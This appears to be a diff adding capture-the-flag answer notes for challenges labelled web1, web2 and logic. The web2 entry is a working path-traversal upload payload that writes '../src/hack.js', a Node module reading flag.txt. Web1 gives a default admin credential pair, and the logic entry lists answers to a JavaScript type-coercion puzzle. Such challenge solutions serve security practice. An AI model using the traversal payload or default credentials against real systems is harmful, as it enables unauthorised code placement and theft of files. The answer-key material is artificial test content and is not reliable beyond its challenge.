@@ -1,0 +1,22 @@
+web1 001 {"collection":"user"}
+web1 002 admin P@ssword
+web2 001
+{
+    "filename":"../src/hack.js",
+	"content":"module.exports = async function(input){const fs = require('fs');const { promisify } = require('util');const readFileAsync = promisify(fs.readFile);const data = await readFileAsync('./flag.txt', 'utf8');return data;};"
+}
+
+logic 001
+{
+	"a":1,
+	"b":true,
+	"c":true,
+	"d":0.1,
+	"e":0.30000000000000004,
+	"f":["1"],
+	"g":9,
+	"h":"91",
+	"i":90,
+	"j":0,
+	"k":"number"
+}
